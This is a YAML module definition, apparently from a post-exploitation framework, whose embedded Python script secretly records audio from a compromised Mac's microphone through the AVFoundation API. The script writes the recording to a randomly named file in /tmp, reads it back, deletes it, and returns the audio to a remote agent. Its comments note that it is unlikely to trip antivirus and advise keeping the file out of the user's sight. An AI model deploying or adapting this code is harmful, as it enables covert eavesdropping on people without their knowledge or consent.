name: osx_mic_record
authors:
  - name: ''
    handle: '@s0lst1c3'
    link: ''
description: Records audio through the MacOS webcam mic by leveraging the Apple AVFoundation API.
software: ''
tactics: []
techniques:
  - T1512
background: false
output_extension: caf
needs_admin: false
opsec_safe: false
language: python
min_language_version: '2.6'
comments:
  - Executed within memory, although recorded audio will touch disk while the script is running. This is unlikely to trip
    A/V, although a user may notice the audio file if it stored in an obvious location.
options:
  - name: Agent
    description: Agent to record audio from.
    required: true
    value: ''
  - name: OutputDir
    description: 'Directory on remote machine in recorded audio should be saved. (Default: /tmp)'
    required: false
    value: /tmp
  - name: RecordTime
    description: 'The length of the audio recording in seconds. (Default: 5)'
    required: false
    value: '5'
script: |-
  import objc
  import objc._objc
  import time
  import sys
  import random
  import os

  from string import ascii_letters
  from Foundation import *
  from AVFoundation import *

  record_time = {{ RecordTime }}
  output_dir = '{{ OutputDir }}'

  if __name__ == '__main__':

      pool = NSAutoreleasePool.alloc().init()

      # construct audio URL
      output_file = ''.join(random.choice(ascii_letters) for _ in range(32))
      output_path = os.path.join(output_dir, output_file)
      audio_path_str = NSString.stringByExpandingTildeInPath(output_path)
      audio_url = NSURL.fileURLWithPath_(audio_path_str)

      # fix metadata for AVAudioRecorder
      objc.registerMetaDataForSelector(
          b"AVAudioRecorder",
          b"initWithURL:settings:error:",
          dict(arguments={4: dict(type_modifier=objc._C_OUT)}),
      )

      # initialize audio settings
      audio_settings = NSDictionary.dictionaryWithDictionary_({
          'AVEncoderAudioQualityKey' : 0,
          'AVEncoderBitRateKey' : 16,
          'AVSampleRateKey': 44100.0,
          'AVNumberOfChannelsKey': 2,
      })

      # create the AVAudioRecorder
      (recorder, error) = AVAudioRecorder.alloc().initWithURL_settings_error_(
                                          audio_url,
                                          audio_settings,
                                          objc.nil,
      )

      # bail if unable to create AVAudioRecorder
      if error is not None:
          NSLog(error)
          sys.exit(1)

      # record audio for record_time seconds
      recorder.record()
      time.sleep(record_time)
      recorder.stop()

      # retrieve content from output file then delete it
      with open(output_path, 'rb') as input_handle:
          captured_audio = input_handle.read()
      run_command('rm -f ' + output_path)

      # return captured audio to agent
      print(captured_audio)

      del pool
